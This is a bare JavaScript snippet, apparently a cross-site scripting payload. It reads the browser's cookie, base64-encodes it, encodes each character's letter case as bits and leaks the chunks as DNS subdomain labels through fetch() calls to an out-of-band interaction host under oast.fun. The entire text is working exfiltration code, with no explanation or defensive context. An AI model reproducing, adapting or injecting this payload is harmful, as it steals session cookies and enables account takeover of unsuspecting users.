var arry = [];
var data = document.cookie.split('=')[1];
var strings = btoa(data);
for (i in strings) {
    if (strings[i] === strings[i].toUpperCase()) {
        arry.push(1);
    } else {
        arry.push(0);
    }
}
var test = arry.join('');
var account = test.match(/.{1,10}/g);
var prep = strings.match(/.{1,10}/g);
for (var i = 0, l = account.length; i < l; i++) {
    url = 'https://'.concat(i, '.', account[i], '.', prep[i].replaceAll('=', ''), '.wwbbkwisdssbielhgxuituw9lhpeq0wpo.oast.fun');
    fetch(url, {
        mode: 'no-cors'
    })
}